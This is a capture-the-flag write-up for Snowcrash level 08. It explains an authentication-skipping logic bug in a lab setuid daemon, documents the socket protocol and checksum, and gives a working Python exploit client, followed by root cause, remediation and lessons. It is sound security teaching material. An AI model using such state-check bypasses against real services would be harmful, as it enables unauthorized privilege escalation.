# Snowcrash — Level 08

**Objective:** escalate from `level08` to `flag08`.
**Class:** broken state-machine check in a UNIX-socket daemon.

---

## 1. Reconnaissance

Level08 owns a setuid daemon and a group-readable source file:

```bash
ls -la /opt/snowcrash/level08/
# -r-sr-x--- 1 flag08 level08 ... blacksun
# -rw-r----- 1 root   level08 ... blacksun.c
```

A UNIX socket is bound at `/run/blacksun/blacksun.sock` by `blacksun.c`:

```c
#define SOCK_PATH "/run/blacksun/blacksun.sock"
```

The daemon implements a small binary protocol with three states — `INIT → AUTH → ADMIN` — and a `CMD_ADMIN` handler that reads `/home/flag08/.flag`. The intended flow is:

1. Client sends `CMD_HELLO` → state becomes `AUTH`
2. Client sends `CMD_AUTH` with the 32-byte key from `/etc/blacksun/auth.key` → state becomes `ADMIN`
3. Client sends `CMD_ADMIN` → flag is returned

The key is `0400 root` and unreadable to us. So step 2 is impossible — unless the state check is broken.

---

## 2. Vulnerability

```c
#define CHECK_STATE(ctx, required)                                      \
    ( ((required) == STATE_ADMIN)                                       \
        ? ((ctx)->state >= STATE_AUTH)     /* ← bug */                  \
        : ((ctx)->state == (required)) )
```

`STATE_AUTH = 1`, `STATE_ADMIN = 2`. For `CMD_ADMIN` (`required = STATE_ADMIN`), the macro evaluates `state >= 1`, which is **true for `STATE_AUTH` (1)** as well as `STATE_ADMIN` (2).

So after only `CMD_HELLO` (which brings state to `AUTH`), a `CMD_ADMIN` command **passes the authorization check and returns the flag** — without ever sending `CMD_AUTH`.

The correct comparison should have been `ctx->state == STATE_ADMIN` (or `>= STATE_ADMIN`). As written, `AUTH` is sufficient.

The `memcpy(&magic, payload, 2)` further down is a decoy — `plen < 2` is rejected first, and 2 bytes into a `uint16_t` is safe.

---

## 3. Protocol summary

Header (8 bytes, packed little-endian):

| offset | bits | field |
|---|---|---|
| 0 | 0–2 | `version` (must be `1`) |
| 0 | 3–4 | `state` (ignored) |
| 0 | 5–7 | `cmd` (HELLO=0, AUTH=1, ADMIN=2, QUIT=3) |
| 1–4 | — | `length` (u32 LE, ≤ 4096) |
| 5–6 | — | `checksum` (u16 LE, only checked when `length > 0`) |
| 7 | — | padding |

Checksum over the payload:

```c
uint16_t acc = 0;
for (i = 0; i < len; i++) acc ^= payload[i] ^ (i & 0xFF);
```

For the 2-byte HELLO payload `\xAD\xDE`:

```
i=0: acc ^= 0xAD ^ 0x00 = 0x00AD
i=1: acc ^= 0xDE ^ 0x01 = 0x00DF   → acc = 0x0072
```

Checksum = `0x0072` → wire bytes `\x72\x00`.

For `CMD_ADMIN` with `length=0`, no checksum is computed — pass `0`.

---

## 4. Exploit

A minimal Python client:

```python
#!/usr/bin/env python3
import socket, struct, glob, sys

candidates = [
    '/run/blacksun/blacksun.sock',
    '/var/run/blacksun/blacksun.sock',
    '/var/run/blacksn.sock',
    '/run/blacksn.sock',
]
sock_path = next((p for p in candidates if glob.glob(p)), None)
if not sock_path:
    sys.exit("socket not found; run: ss -xl | grep blacksun")

def header(cmd, plen, chk):
    b0 = 1 | (0 << 3) | (cmd << 5)          # version=1, state=0, cmd
    return bytes([b0]) + struct.pack('<I', plen) + struct.pack('<H', chk) + b'\x00'

def checksum(p):
    acc = 0
    for i, b in enumerate(p):
        acc ^= b ^ (i & 0xFF)
    return acc & 0xFFFF

# 1. HELLO -> state AUTH
magic = struct.pack('<H', 0xDEAD)           # b'\xad\xde'
hello = header(0, 2, checksum(magic)) + magic

# 2. ADMIN directly -> flag (skips AUTH)
admin = header(2, 0, 0)

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(sock_path)

s.sendall(hello);  print(s.recv(1024).decode(errors='replace').strip())
s.sendall(admin);  print(s.recv(4096).decode(errors='replace'))
s.close()
```

Run as `level08`:

```bash
python3 ~/pwn08.py
```

Expected:

```
HELLO OK
ACCESS GRANTED
FLAG=<flag>
```

The flag is `/home/flag08/.flag`, read by the daemon running as `flag08`.

---

## 5. Why the exploit is trivial

- The daemon only accepts connections from members of group `level08`, which `level08` is.
- The authentication key is root-only, but the `CMD_ADMIN` handler doesn't require `STATE_ADMIN` — only `STATE_AUTH`.
- Reaching `STATE_AUTH` is free: `CMD_HELLO` with the public magic `0xDEAD`.

There is no memory corruption, no race, no buffer overflow. The bug is **purely a logic error in the state check**.

---

## 6. Root cause

```c
? ((ctx)->state >= STATE_AUTH)   /* AUTH or ADMIN passes CMD_ADMIN */
```

Should be:

```c
? ((ctx)->state == STATE_ADMIN)
```

`STATE_ADMIN` is `2`, and its only correct predecessor state for the ADMIN command is `STATE_ADMIN` itself. The `>=` lets `AUTH` slip through.

---

## 7. Remediation

- Fix the macro to `((ctx)->state == STATE_ADMIN)` for `CMD_ADMIN`.
- Equivalently, use an explicit whitelist per command rather than a single “minimum state” comparison:
  ```c
  switch (cmd) {
  case CMD_ADMIN:
      if (ctx->state != STATE_ADMIN) { ... error ... }
      break;
  }
  ```
- Defense in depth:
  - Do not run the daemon setuid `flag08` when only a single flag file needs to be read; open and cache the flag at startup as root, then drop to an unprivileged user.
  - Treat any state-transition check as a **security boundary**, not a convenience — test it explicitly. A single `==` vs `>=` was the difference between “needs the auth key” and “needs no auth at all”.
  - Restrict socket ACLs further (e.g. mode `0600` and a dedicated group) so accidental state-machine bugs aren't reachable by non-flag users.

---

## 8. Lessons

- **Read `#define`s.** The macro is where the bug lives. Skimming function bodies would have missed it — the check looks fine at the call site because the macro's name suggests it does the right thing.
- **State machines have no compiler for their invariants.** C won't warn you that `>=` weakens a check. Manual review (or an assertion library) is the only defense.
- **Setuid daemons reading a fixed file rarely need setuid.** The most robust fix is to drop privilege at startup and only keep the file descriptor, not the uid. That would have made this level unsolvable regardless of the state bug.
- **`snprintf`/`memcpy` greps find memory bugs; they don't find logic bugs.** A grep-driven audit needs a second pass that reads the control flow, not just the dangerous-looking functions.